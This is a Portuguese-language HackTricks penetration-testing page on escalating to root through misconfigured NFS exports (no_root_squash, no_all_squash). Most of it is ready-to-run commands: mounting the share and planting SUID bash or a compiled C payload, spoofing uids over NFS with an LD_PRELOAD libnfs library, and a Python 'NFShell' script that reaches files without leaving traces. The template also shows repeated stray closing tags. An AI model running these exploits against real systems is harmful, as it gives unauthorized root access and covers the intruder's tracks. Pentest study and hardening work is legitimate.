{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


Leia o _ **/etc/exports** _ arquivo, se você encontrar algum diretório que está configurado como **no\_root\_squash**, então você pode **acessar** ele **como um cliente** e **escrever dentro** daquele diretório **como** se você fosse o **root** local da máquina.

**no\_root\_squash**: Esta opção basicamente dá autoridade ao usuário root no cliente para acessar arquivos no servidor NFS como root. E isso pode levar a sérias implicações de segurança.

**no\_all\_squash:** Isso é semelhante à opção **no\_root\_squash**, mas se aplica a **usuários não-root**. Imagine, você tem um shell como usuário nobody; verificou o arquivo /etc/exports; a opção no\_all\_squash está presente; verifique o arquivo /etc/passwd; emule um usuário não-root; crie um arquivo suid como esse usuário (montando usando nfs). Execute o suid como usuário nobody e torne-se um usuário diferente.

# Escalada de Privilégios

## Exploit Remoto

Se você encontrou essa vulnerabilidade, você pode explorá-la:

* **Montando aquele diretório** em uma máquina cliente, e **como root copiando** dentro da pasta montada o binário **/bin/bash** e dando a ele direitos **SUID**, e **executando a partir da máquina da vítima** aquele binário bash.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **Montando esse diretório** em uma máquina cliente, e **como root copiando** dentro da pasta montada nosso payload compilado que irá abusar da permissão SUID, dando a ele direitos **SUID**, e **executando a partir da máquina da vítima** esse binário (você pode encontrar aqui alguns [payloads C SUID](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Exploit Local

{% hint style="info" %}
Note que se você puder criar um **túnel da sua máquina para a máquina da vítima, você ainda pode usar a versão Remota para explorar essa escalada de privilégio tunelando as portas necessárias**.\
O seguinte truque é caso o arquivo `/etc/exports` **indique um IP**. Nesse caso, você **não poderá usar** em nenhum caso o **exploit remoto** e precisará **abusar desse truque**.\
Outro requisito necessário para que o exploit funcione é que **a exportação dentro de `/etc/export`** **deve estar usando a flag `insecure`**.\
\--_Não tenho certeza se, caso `/etc/export` esteja indicando um endereço IP, esse truque funcionará_--
{% endhint %}

## Informações Básicas

O cenário envolve explorar um compartilhamento NFS montado em uma máquina local, aproveitando uma falha na especificação do NFSv3 que permite ao cliente especificar seu uid/gid, potencialmente permitindo acesso não autorizado. A exploração envolve o uso de [libnfs](https://github.com/sahlberg/libnfs), uma biblioteca que permite a falsificação de chamadas RPC NFS.

### Compilando a Biblioteca

Os passos de compilação da biblioteca podem exigir ajustes com base na versão do kernel. Neste caso específico, as chamadas de sistema fallocate foram comentadas. O processo de compilação envolve os seguintes comandos:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Realizando o Exploit

O exploit envolve a criação de um programa C simples (`pwn.c`) que eleva privilégios para root e, em seguida, executa um shell. O programa é compilado e o binário resultante (`a.out`) é colocado no compartilhamento com suid root, usando `ld_nfs.so` para falsificar o uid nas chamadas RPC:

1. **Compile o código do exploit:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Coloque o exploit no compartilhamento e modifique suas permissões falsificando o uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Execute o exploit para obter privilégios de root:**
```bash
/mnt/share/a.out
#root
```

## Bônus: NFShell para Acesso a Arquivos de Forma Discreta
Uma vez obtido o acesso root, para interagir com o compartilhamento NFS sem mudar a propriedade (para evitar deixar rastros), um script Python (nfsh.py) é usado. Este script ajusta o uid para corresponder ao do arquivo sendo acessado, permitindo a interação com arquivos no compartilhamento sem problemas de permissão:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Executar como:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
